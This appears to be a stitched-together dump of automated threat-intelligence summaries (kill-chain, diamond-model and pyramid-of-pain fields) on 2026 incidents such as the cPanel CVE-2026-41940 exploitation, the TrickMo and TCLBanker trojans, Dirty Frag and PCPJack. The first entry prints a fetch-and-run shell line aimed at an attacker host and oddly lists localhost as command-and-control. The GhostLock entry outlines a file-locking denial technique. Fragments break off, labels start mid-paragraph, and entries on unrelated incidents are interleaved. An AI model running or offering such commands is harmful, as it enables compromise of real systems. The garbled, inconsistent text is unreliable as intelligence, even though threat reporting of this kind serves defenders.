kill_chain_summary: The attack begins with reconnaissance, where the adversary identifies vulnerable systems running the Cline AI kanban package. Weaponization involves crafting malicious websites to exploit WebSocket vulnerabilities. Delivery occurs when developers visit these websites, leading to exploitation of the vulnerability. The adversary establishes command and control using WebSocket connections and performs actions on objectives, including data exfiltration and denial-of-service attacks. The attack leverages missing authentication and origin validation in WebSocket connections, affecting developers across multiple operating systems.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes IP addresses and command lines as indicators. The adversary exploits WebSocket vulnerabilities, using IP addresses like 127.0.0.1:3484 for command and control. Command lines such as 'curl https://attacker.com/shell.sh | bash' are used for remote code execution. These indicators are crucial for detection and response, as they provide insight into the adversary's tactics and techniques. The lack of authentication and origin validation in WebSocket connections is a significant weakness exploited by the adversary.

diamond_model_summary: The TrickMo Android banking trojan targets users in France, Italy, and Austria, leveraging The Open Network (TON) for command-and-control (C2) communications. Victims are primarily in the financial services sector, with a focus on banking and cryptocurrency accounts. doc_summary: TrickMo is an Android banking trojan targeting users in France, Italy, and Austria. The latest variant, TrickMo C, observed by ThreatFabric, uses The Open Network (TON) for command-and-control (C2) communications. It includes features like SSH tunneling, SOCKS5 proxying, and network reconnaissance tools such as curl, dnslookup, ping, telnet, and traceroute. TrickMo abuses Android's accessibility services to hijack OTPs and phish credentials. The malware is distributed via phishing websites and dropper apps masquerading as TikTok and Google Play Services. It turns infected devices into network exit nodes, complicating IP-based fraud detection. The malware's use of TON for C2 reduces the effectiveness of traditional takedown efforts.
kill_chain_summary: TrickMo follows a sophisticated kill chain, starting with reconnaissance using network tools like curl and dnslookup. Delivery occurs via phishing websites and dropper apps, exploiting Android accessibility services for exploitation. Installation involves a runtime-loaded APK for persistence. Command and control are achieved through TON, using multi-hop proxies for stealth. Actions on objectives include credential theft and network pivoting, targeting banking and cryptocurrency users.

Discovered by Metin Yunus Kandemir, the flaw involves improper validation of base64-encoded profile pictures, allowing malicious JavaScript code to be executed. Attackers can craft payloads containing reverse shells, which are uploaded as profile photos. When victims visit the image link, the code executes in their context, potentially compromising administrators and standard users alike. The vulnerability remains unpatched in version 0.7.2, and mitigation involves restricting media types to safe formats. The disclosure process was contentious, with developers initially dismissing the report as a duplicate, prompting public disclosure by researchers.

doc_summary: SAP released May 2026 security updates addressing 15 vulnerabilities across multiple products, including critical flaws in Commerce Cloud and S/4HANA. Commerce Cloud, an enterprise-grade e-commerce platform, and S/4HANA, a cloud-based ERP suite, are affected. The first critical flaw is a missing authentication check in SAP Commerce Cloud, allowing unauthenticated attackers to execute code on vulnerable servers due to improper Spring Security configuration. The second critical vulnerability in S/4HANA enables attackers with basic privileges to inject malicious SQL statements, leading to unauthorized access to sensitive database information. SAP's security advisory also lists fixes for one high-severity flaw and 11 medium-severity issues, including command injection, missing authorization checks, XSS, CSRF, and denial-of-service. No evidence of exploitation in the wild has been found, but similar vulnerabilities have been added to CISA's Known Exploited Vulnerabilities catalog.
kill_chain_summary: The incident primarily involves the exploitation stage, where adversaries could exploit vulnerabilities in SAP Commerce Cloud and S/4HANA. doc_summary: TeamPCP, a threat actor, executed a supply chain attack targeting npm and PyPI packages from companies like TanStack, UiPath, and Mistral AI. The attack was assigned CVE-2026-45321 with a critical CVSS score of 9.6. The malware spread to other packages, including those in PyPI, and featured a geofenced destructive payload targeting systems in Israel and Iran.

doc_summary: California Attorney General Rob Bonta announced a $12.75 million settlement with General Motors (GM) over allegations of violating the California Consumer Privacy Act (CCPA). The violations stem from GM's illegal collection and sale of Californians' driving and location data to data brokers, including Verisk Analytics, between 2020 and 2024. The data was collected through GM's OnStar subsidiary and its Smart Driver system, intended for driver-scoring products related to insurance. The U.S. Federal Trade Commission (FTC) previously criticized GM for unlawful data collection. California authorities stated GM failed to notify consumers or obtain consent for data collection, retaining data longer than necessary and repurposing it for sale. The $12.75 million civil penalty is a record in California's history and the first enforcement action focused on data minimization rules. GM's data sales did not result in higher insurance premiums for California drivers due to state law prohibiting insurers from using driving data to set rates.

diamond_model_summary: The incident involves the threat actor Mr_Rot13 exploiting a critical cPanel vulnerability, CVE-2026-41940, to deploy a backdoor named Filemanager. The adversary's capability includes exploiting public-facing applications and using ROT13 encoding for data exfiltration. The infrastructure involves domains like cp.dene.de.com and wrned.com for command and control. Victims are cPanel users globally, with significant activity in Germany, United States, Brazil, and Netherlands.
doc_summary: A threat actor named Mr_Rot13 exploited a critical cPanel flaw, CVE-2026-41940, to deploy a backdoor named Filemanager. This vulnerability allows authentication bypass, enabling remote attackers to control cPanel. QiAnXin XLab reported multiple threat actors exploiting this flaw for cryptocurrency mining, ransomware, botnet propagation, and backdoor implantation. Over 2,000 attacker IPs from Germany, United States, Brazil, and Netherlands are involved. A shell script downloads a Go-based infector from cp.dene.de.com, implants an SSH key, and drops a PHP web shell for remote command execution. JavaScript code injects a fake login page to steal credentials, encoded with ROT13, and transmits them to wrned.com. The attack culminates in a cross-platform backdoor affecting Windows, macOS, and Linux. Sensitive data is exfiltrated to a Telegram group by user 0xWR. The C2 domain was first registered in October 2020, with low detection rates for Mr_Rot13's infrastructure.
kill_chain_summary: The attack begins with the exploitation of CVE-2026-41940, allowing the adversary to bypass authentication and gain access to cPanel environments. A shell script is used to deliver a Go-based infector, which installs a backdoor and implants an SSH key for persistence. The adversary uses JavaScript injection to steal credentials, which are exfiltrated to a C2 domain. The attack culminates in the deployment of a cross-platform backdoor, affecting Windows, macOS, and Linux systems.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes domain names like cp.dene.de.com and wrned.com, which are critical for the adversary's command and control operations. The use of ROT13 encoding for data exfiltration and the deployment of a cross-platform backdoor are significant TTPs. Monitoring network traffic for connections to these domains and detecting unauthorized SSH key additions are key detection strategies.

Title: CVE-2026-0073: Critical Android ADB Vulnerability Exploited

Victim.Description: Android devices with wireless ADB enabled, including developer phones and enterprise test fleets.
Victim.Security_Posture: Vulnerable if wireless ADB is enabled and unpatched.

diamond_model_summary: The incident involves the exploitation of CVE-2026-0073, a critical Android vulnerability, by adversaries seeking unauthorized shell access via the ADB component. The capability involves exploiting a logic error in the wireless ADB mutual-authentication path, allowing attackers to impersonate a paired ADB host. The infrastructure requires network reachability to the ADB-over-TCP service, commonly through wireless debugging. Victims include Android devices with wireless ADB enabled, affecting developer phones, lab devices, and enterprise test fleets. The severity is critical due to the potential for unauthorized access and control of Android devices.
doc_summary: CVE-2026-0073 is a critical Android vulnerability documented in Google's May 2026 security bulletin. It involves a no-interaction remote code execution flaw in the adbd component, allowing attackers to execute code as the shell user without device owner interaction. The vulnerability stems from a logic error in the wireless ADB mutual-authentication path, specifically in the adbd_tls_verify_cert function inside auth.cpp. This flaw allows a crafted TLS client certificate to be incorrectly treated as trusted, enabling unauthorized remote systems to impersonate a paired ADB host and open a shell session. The issue is an authentication bypass, not a memory-corruption problem, making it particularly notable. The vulnerability affects developer phones, lab devices, emulators, and enterprise test fleets with wireless debugging enabled. Exploitation requires network reachability to the device's ADB-over-TCP service, commonly through wireless debugging. Public exploit references suggest researchers have moved the issue from advisory language to a reproducible attack path, changing the risk profile for organizations relying on Android devices. Google has addressed the issue in the May 2026 Android Security Bulletin, and defenders are urged to patch affected devices and disable wireless debugging where not needed.
kill_chain_summary: The kill chain for this incident begins with reconnaissance, where adversaries identify Android devices with wireless ADB enabled. Weaponization involves developing or obtaining a proof-of-concept exploit for CVE-2026-0073. Exploitation occurs when adversaries use the exploit to gain shell access. Command and control is maintained via shell access, allowing adversaries to perform system inspection and package interaction. The actions on objectives stage involves adversaries executing commands to discover files and directories on the compromised device. The incident highlights the importance of patching and disabling unnecessary services to prevent exploitation.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes the use of a proof-of-concept exploit for CVE-2026-0073, which is a significant tool for adversaries. The exploitation of the ADB-over-TCP service represents a network host artifact. The TTPs employed include authentication bypass and remote code execution. No specific hash values, IP addresses, or domain names were identified in the incident. The scoring reflects the presence of tools and TTPs, emphasizing the need for defenders to focus on detecting and mitigating these elements to disrupt adversary operations.

Title: PHP SOAP Extension Vulnerabilities Leading to RCE and UAF Exploits

Victim.Description: Servers running vulnerable PHP versions with SOAP extension.

diamond_model_summary: The incident involves advanced threat actors exploiting vulnerabilities in the PHP SOAP extension, particularly CVE-2026-6722, which allows Remote Code Execution. The adversaries demonstrate high sophistication by leveraging Use-After-Free and NULL pointer dereference vulnerabilities. The infrastructure targeted includes web servers running vulnerable PHP versions, with the primary objective being unauthorized control and potential data manipulation.
doc_summary: Recently disclosed vulnerabilities in PHP, particularly within its SOAP extension, have raised alarms in the cybersecurity community. A high-severity vulnerability, CVE-2026-6722, allows Remote Code Execution (RCE) by exploiting a Use-After-Free (UAF) flaw in the ext-soap package. Other vulnerabilities include CVE-2026-7261, a moderate-severity UAF tied to SoapServer session persistence, and CVE-2026-7262, a NULL pointer dereference in the Apache Map decoder. Additional out-of-bounds read vulnerabilities, CVE-2026-7258 and CVE-2026-6104, affect PHP core functions like urldecode() and mb_convert_encoding(). These issues impact PHP versions before 8.2.31, 8.3.31, 8.4.21, and 8.5.6. The PHP development team has released patches to address these flaws. Researchers BrettGervasoni, iliaal, xfourj, and AkshayJainG disclosed these vulnerabilities, with remediation patches developed by iluuu1994 and reviewed by ndossche.
kill_chain_summary: The attack chain begins with the weaponization of malicious XML payloads to exploit Use-After-Free vulnerabilities in the PHP SOAP extension. The exploitation phase involves gaining initial access through public-facing application vulnerabilities, leading to potential Remote Code Execution. The attackers aim to execute arbitrary code on affected servers, posing a high risk to server integrity and data security.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes TTPs such as Use-After-Free exploitation and Remote Code Execution, which are challenging for defenders to address. The vulnerabilities CVE-2026-6722, CVE-2026-7261, and others represent significant pain points due to their potential for severe impact. The absence of specific hash values, IP addresses, or domains limits immediate detection capabilities, emphasizing the need for robust patch management and memory safety practices.

doc_summary: A critical authentication bypass vulnerability, CVE-2026-41940, affecting cPanel and WHM servers is actively exploited by the Mr_Rot13 syndicate. The attack involves deploying Go-based payload injectors, implanting backdoors, and establishing remote control. The syndicate has targeted Southeast Asian government networks, exfiltrating sensitive data. The attack chain includes custom payload infectors, SSH key implants, and JavaScript credential interception. The group uses ROT13 for domain obfuscation and Telegram for data exfiltration. kill_chain_summary: The attack begins with reconnaissance to identify vulnerable cPanel and WHM servers, followed by weaponization using Go-based payload injectors. Delivery occurs via remote servers, leading to exploitation of CVE-2026-41940 for administrator access. Installation of backdoors and webshells ensures persistence. doc_summary: The GhostLock attack, disclosed in May 2026 by security researcher Kim Dvash, demonstrates a novel technique to paralyze enterprise file systems without encrypting data. This attack leverages the CreateFileW API in Windows, allowing a low-privileged domain user account to lock files on a network attached storage system. By setting the sharing mode parameter to 0, the system grants an exclusive deny-share handle, preventing other processes from accessing the files. The attack bypasses traditional cybersecurity defenses, leaving no forensic signature and evading detection by behavioral AI models and anomaly detectors. The only reliable indicator is the number of simultaneous exclusive handles in the storage management session table. Security teams must update incident response runbooks to coordinate with storage administrators to terminate offending network sessions.

The most severe flaw, CVE-2026-29202, involves a critical Perl code-injection vulnerability in the create_user API call. CVE-2026-29201 exposes servers to arbitrary file reads via the feature::LOADFEATUREFILE adminbin call. CVE-2026-29203 stems from unsafe symlink handling, allowing local users to execute chmod commands on arbitrary files. doc_summary: Attackers are exploiting Google Ads and Claude.ai shared chats in a malvertising campaign targeting users searching for 'Claude mac download'. The campaign involves sponsored search results leading to malware installation instructions on macOS. Berk Albayrak, a security engineer at Trendyol Group, identified a Claude.ai shared chat posing as an official 'Claude Code on Mac' guide, attributed to 'Apple Support'. The chat instructs users to open Terminal and paste a command that downloads and executes malware. BleepingComputer confirmed the attack through separate infrastructure. The script checks for Russian or CIS-region keyboard input, collects victim profiling data, and executes a second-stage payload via macOS's scripting engine. Albayrak's variant skips profiling, directly harvesting browser credentials and macOS Keychain contents, identified as a MacSync infostealer variant. The campaign abuses Anthropic's real domain, hosting malicious instructions inside Claude's shared chat feature. Users are advised to download the native Claude app directly from claude.ai and treat terminal command instructions with caution.

doc_summary: Cybersecurity researchers have disclosed a critical security vulnerability in Ollama, tracked as CVE-2026-7482, with a CVSS score of 9.1. The vulnerability, codenamed Bleeding Llama by Cyera, affects over 300,000 servers globally. It involves an out-of-bounds read flaw in the GGUF model loader, allowing remote, unauthenticated attackers to leak process memory. The flaw stems from the unsafe package used in the WriteTo() function, enabling operations that bypass memory safety. Exploitation can lead to data exfiltration, including environment variables, API keys, and user data. Additionally, Striga researchers identified two vulnerabilities in Ollama's Windows update mechanism, allowing persistent code execution. Users are advised to apply fixes, limit network access, and deploy authentication proxies.
kill_chain_summary: The attack begins with the weaponization of malicious GGUF files, followed by their delivery to vulnerable Ollama servers. doc_summary: TCLBANKER is a Brazilian banking trojan capable of targeting 59 banking, fintech, and cryptocurrency platforms. Tracked by Elastic Security Labs as REF3076, it is a major update of the Maverick malware, which uses the SORVEPOTEL worm to spread via WhatsApp Web. The attack chain involves a loader with anti-analysis capabilities deploying a banking trojan and a worm component. The malware abuses a signed Logitech program for DLL side-loading, executing only if loaded by specific executables. It generates fingerprints for anti-debugging and anti-virtualization checks, ensuring execution on Brazilian systems. TCLBANKER establishes persistence, communicates with external servers, and uses a URL monitor to target financial institutions. It employs social engineering tactics for data theft and propagates via WhatsApp and Outlook. The campaign reflects a maturation in the Brazilian banking trojan ecosystem, using sophisticated techniques like environment-gated payload decryption and WebSocket command dispatch.

Delivery is achieved via DLL side-loading, exploiting a signed Logitech program. Installation involves persistence through scheduled tasks. The campaign reflects a maturation in the Brazilian banking trojan ecosystem.

Title: Dirty Frag: New Linux Kernel Vulnerability Exploit

doc_summary: A new Linux kernel vulnerability class, Dirty Frag, has been disclosed, allowing local privilege escalation across major Linux distributions. The exploit manipulates the kernel's page cache, enabling attackers to gain root access without write permissions on disk files. Two vulnerabilities, xfrm-ESP and RxRPC Page-Cache Write, are chained to bypass protections. The xfrm-ESP flaw exists in the IPsec stack since 2017, while RxRPC was introduced in 2023. The exploit affects Ubuntu, RHEL, Fedora, CentOS Stream, AlmaLinux, and openSUSE. Mitigation involves blocking esp4, esp6, and rxrpc kernel modules. No official patches are available yet.
kill_chain_summary: The Dirty Frag exploit follows a structured attack path, beginning with the weaponization of two Linux kernel vulnerabilities. doc_summary: Cybersecurity researchers have disclosed details of a new Linux backdoor named PamDOORa, advertised on the Rehub Russian cybercrime forum for $1,600 by a threat actor called darkworm. The backdoor is designed as a Pluggable Authentication Module (PAM)-based post-exploitation toolkit that enables persistent SSH access via a magic password and specific TCP port combination. It can harvest credentials from legitimate users who authenticate through the compromised system. PamDOORa is the second Linux backdoor targeting the PAM stack after Plague. PAM is a security framework in Unix/Linux operating systems that allows system administrators to incorporate multiple authentication mechanisms. The pam_exec module can be exploited by attackers to gain unauthorized access or establish persistent control. PamDOORa incorporates anti-forensic capabilities to tamper with authentication logs. The malware's initial asking price was $1,600, reduced to $900 by April 9, 2026.

The capability to exploit this vulnerability is high, given the deterministic nature of the bug. The infrastructure primarily involves Linux distributions, and the victims are systems running affected Linux kernels. The impact severity is high due to the potential for gaining root access.
doc_summary: A new local privilege escalation vulnerability named Dirty Frag has been identified in the Linux kernel. It is considered a successor to Copy Fail (CVE-2026-31431) and allows unprivileged local users to gain root access on various Linux distributions, including Ubuntu 24.04.4, RHEL 10.1, openSUSE Tumbleweed, CentOS Stream 10, AlmaLinux 10, and Fedora 44. The vulnerability exploits the xfrm-ESP Page-Cache Write and RxRPC Page-Cache Write vulnerabilities. The xfrm-ESP vulnerability was introduced in a 2017 commit, while the RxRPC vulnerability appeared in 2023. The exploit requires creating a namespace, which is blocked by Ubuntu's AppArmor, but RxRPC can be used on systems where the rxrpc.ko module is loaded by default. A proof-of-concept has been released, and until patches are available, it is advised to blocklist esp4, esp6, and rxrpc modules.
kill_chain_summary: The Dirty Frag vulnerability follows a typical exploitation kill chain. The adversary gains initial access through local privilege escalation by exploiting the vulnerability. The exploitation stage is critical, as it allows the adversary to gain root privileges on affected Linux systems. Detection involves monitoring for unusual process creation and unauthorized namespace creation attempts. Remediation includes blocklisting vulnerable modules and applying patches once available. The vulnerability's deterministic nature increases the likelihood of successful exploitation.
pyramid_of_pain_summary: The Pyramid of Pain for the Dirty Frag vulnerability includes several key indicators. The exploit involves specific vulnerabilities (xfrm-ESP and RxRPC Page-Cache Write), which are challenging to detect and remediate. The lack of specific hash values, IP addresses, or domain names makes detection more difficult. However, monitoring for unusual process activities and unauthorized namespace creation can help identify exploitation attempts. The high impact of the vulnerability on Linux systems underscores the need for effective detection and remediation strategies.

Victim.Description: The primary victims are users of banking, fintech, and cryptocurrency platforms in Brazil.

diamond_model_summary: The TCLBanker incident involves an adversary targeting financial services in Brazil using advanced evasion techniques. The adversary employs a trojanized MSI installer for Logitech AI Prompt Builder to deliver the malware, which includes self-spreading worm modules for WhatsApp and Outlook. The malware is loaded via DLL side-loading, avoiding detection by security products. TCLBanker monitors browser activity and establishes a WebSocket session with the C2 server for remote control operations. The adversary's strategic objective is to steal financial information and credentials from targeted platforms.
doc_summary: TCLBanker is a new trojan targeting 59 banking, fintech, and cryptocurrency platforms, primarily in Brazil. It uses a trojanized MSI installer for Logitech AI Prompt Builder to infect systems. The malware includes self-spreading worm modules for WhatsApp and Outlook, allowing it to propagate autonomously. TCLBanker is believed to be an evolution of the Maverick/Sorvepotel malware family. It features environment-dependent payload decryption routines and a persistent watchdog thread to evade analysis. The malware is loaded via DLL side-loading within the legitimate Logitech application, avoiding detection by security products. The banking module monitors browser activity and establishes a WebSocket session with the C2 server for remote control operations. TCLBanker uses a WPF-based overlay system to steal data and propagate to contacts through hijacked WhatsApp and Outlook accounts.
kill_chain_summary: The TCLBanker attack follows a structured kill chain, starting with reconnaissance to identify potential targets in the financial sector. The adversary weaponizes the MSI installer for Logitech AI Prompt Builder to deliver TCLBanker, which is installed on victim systems via DLL side-loading. The malware establishes a WebSocket session with the C2 server for command and control, allowing the adversary to perform data theft and propagate to new victims via WhatsApp and Outlook. The attack demonstrates advanced evasion techniques and a focus on financial gain.
pyramid_of_pain_summary: The TCLBanker incident presents challenges in detection and response due to its advanced evasion techniques. The malware uses DLL side-loading and environment-dependent payload decryption to avoid detection. The use of a trojanized MSI installer and self-spreading worm modules for WhatsApp and Outlook complicates traditional detection methods. The Pyramid of Pain highlights the difficulty in detecting and responding to such advanced threats, emphasizing the need for robust detection and response capabilities.

Title: Credential Theft Framework PCPJack Targets Cloud Infrastructure

Victim.Description: PCPJack targets cloud infrastructure, specifically services like Docker, Kubernetes, Redis, MongoDB, and RayML.

diamond_model_summary: PCPJack is a credential theft framework targeting cloud infrastructure, potentially linked to a former member of TeamPCP. It shares significant targeting overlaps with TeamPCP, focusing on cloud services like Docker, Kubernetes, and Redis. The campaign aims to generate illicit revenue through credential theft and other malicious activities.
doc_summary: Cybersecurity researchers have disclosed details of a new credential theft framework named PCPJack, which targets exposed cloud infrastructure and removes artifacts linked to TeamPCP. The toolset harvests credentials from cloud, container, developer, productivity, and financial services, exfiltrating data through attacker-controlled infrastructure while spreading to additional hosts. PCPJack targets cloud services like Docker, Kubernetes, Redis, MongoDB, RayML, and vulnerable web applications, allowing operators to spread in a worm-like fashion and move laterally within compromised networks. The campaign aims to generate illicit revenue through credential theft, fraud, spam, extortion, or resale of stolen access. PCPJack shares significant targeting overlaps with TeamPCP, a threat actor known for exploiting security vulnerabilities and misconfigurations in cloud services. PCPJack lacks a cryptocurrency mining component, unlike TeamPCP, suggesting it could be the work of a former TeamPCP member. The attack starts with a bootstrap shell script that prepares the environment, downloads next-stage tooling, and removes TeamPCP artifacts. Six Python payloads are used, with propagation targets pulled from Common Crawl. The threat actor's infrastructure includes a shell script that detects CPU architecture and fetches the appropriate Sliver binary, scanning for credentials associated with various services and transmitting them to an external server.
kill_chain_summary: PCPJack follows a structured attack chain, starting with reconnaissance to identify exposed cloud services, followed by weaponization and delivery of payloads via a bootstrap shell script. Exploitation of vulnerabilities allows for installation of Python scripts, establishing persistence. Command and control is maintained for data exfiltration, with actions on objectives focusing on credential theft and removal of TeamPCP artifacts.
pyramid_of_pain_summary: PCPJack's indicators of compromise include specific tools and techniques used for credential theft and lateral movement within cloud environments. The framework's modular design and focus on removing competing threat actor artifacts highlight its sophistication. Despite lacking specific hash values or IP addresses, the campaign's tactics and tools provide valuable insights for detection and mitigation.

doc_summary: Palo Alto Networks disclosed a critical buffer overflow vulnerability, CVE-2026-0300, in its PAN-OS software, allowing unauthenticated remote code execution. The flaw was exploited by a suspected state-sponsored threat cluster, CL-STA-1132, starting April 9, 2026. Attackers injected shellcode into an nginx worker process and conducted Active Directory enumeration, deploying tools like EarthWorm and ReverseSocks5. The activity is linked to China-nexus hacking groups. Mitigation includes restricting access to the User-ID Authentication Portal. The incident highlights the focus on edge-network assets by nation-state actors.

Following exploitation, the attacker installed shellcode and additional payloads, including EarthWorm and ReverseSocks5, to establish command and control. The adversary conducted Active Directory enumeration and attempted to cover their tracks by clearing logs and deleting core dump files. The attack highlights the importance of securing edge-network assets and applying timely patches to prevent unauthorized access.

Effective mitigation requires a combination of patch management, network monitoring, and access restrictions to reduce the attack surface and detect anomalous activities.

Title: Critical Sandbox-Escape Vulnerabilities in vm2 Node.js Library

Victim.Description: Organizations using vm2 for sandboxing in Node.js environments.

diamond_model_summary: The incident involves critical sandbox-escape vulnerabilities in the vm2 Node.js library, allowing attackers to execute arbitrary commands on host systems. The vulnerabilities are primarily due to flaws in vm2's internal bridge mechanism, which attackers exploit by manipulating JavaScript primitives. Organizations using vm2 should upgrade to version 3.11.1 and consider more secure alternatives.
doc_summary: Multiple critical sandbox-escape vulnerabilities have been disclosed in vm2, a widely used Node.js sandboxing library. These vulnerabilities allow attackers to escape the isolated execution environment and run arbitrary commands on the host system. Eleven advisories were published, affecting versions up to 3.11.1, with patches available for most issues. However, two flaws remain unpatched. The vulnerabilities stem from flaws in vm2's internal bridge mechanism, allowing attackers to manipulate JavaScript primitives and obtain host-realm object references. CVE-2026-26956 targets Node.js v25 environments using WebAssembly's JSTag exception handling. CVE-2026-43999 exposes a logic flaw in NodeVM's builtin allowlist. CVE-2026-44007 affects applications using nesting: true. Organizations should upgrade to version 3.11.1 and monitor for patches addressing CVE-2026-44008 and CVE-2026-44009. Security teams should consider replacing vm2 with more hardened alternatives.
kill_chain_summary: The attack chain involves exploiting vulnerabilities in the vm2 library to escape the sandbox environment and execute commands on the host system. The exploitation stage is critical, with attackers leveraging flaws in vm2's bridge mechanism. Organizations should monitor for unusual process execution patterns and upgrade to patched versions to mitigate risks.
pyramid_of_pain_summary: The Pyramid of Pain for this incident includes tools like vm2 and TTPs related to sandbox escape vulnerabilities. Organizations should focus on behavioral detection and upgrading to secure versions.

doc_summary: Cisco has issued a high-severity security advisory for a critical connection exhaustion vulnerability, CVE-2026-20188, affecting its network management software, specifically the Cisco Crosswork Network Controller (CNC) and Cisco Network Services Orchestrator (NSO). This vulnerability, with a CVSS score of 7.5, allows unauthenticated remote attackers to disrupt network operations by flooding the system with connection requests, leading to a Denial-of-Service (DoS) condition. The flaw was discovered during a Cisco TAC support case, and no active exploits are known. Cloud environments require immediate access to audit logs and configurations to prevent loss of ephemeral telemetry.
